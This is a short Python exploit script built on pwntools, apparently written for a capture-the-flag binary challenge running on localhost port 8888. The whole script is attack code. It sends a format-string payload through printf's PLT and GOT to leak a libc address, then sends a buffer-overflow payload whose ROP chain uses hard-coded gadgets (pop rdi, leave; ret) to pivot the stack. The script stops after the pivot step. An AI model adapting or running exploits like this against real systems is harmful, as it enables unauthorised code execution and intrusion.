#! /usr/bin/env python

from pwn import *

io = remote('localhost', 8888)

raw_input('@')

printf_plt = 0x400600
printf_got = str(0x600fd8).ljust(8, '\x00')
fmt_leak_libc = '%6$s'.ljust(8, '\x00')

ROP_addr = 0x601060

# gadgets
pop_rdi = 0x400883
leave_ret = 0x400818


fmt_ROP = p64(pop_rdi) + fmt_leak_libc + p64(printf_plt)

MARK = 'AAAA'

io.sendafter('something:', fmt_ROP)

payload = p64(0x400820) + p64(0x400630) + 'A'*8 
bof = payload + p64(leave_ret) #+ p64(ROP_addr)
io.sendafter('say?', bof)

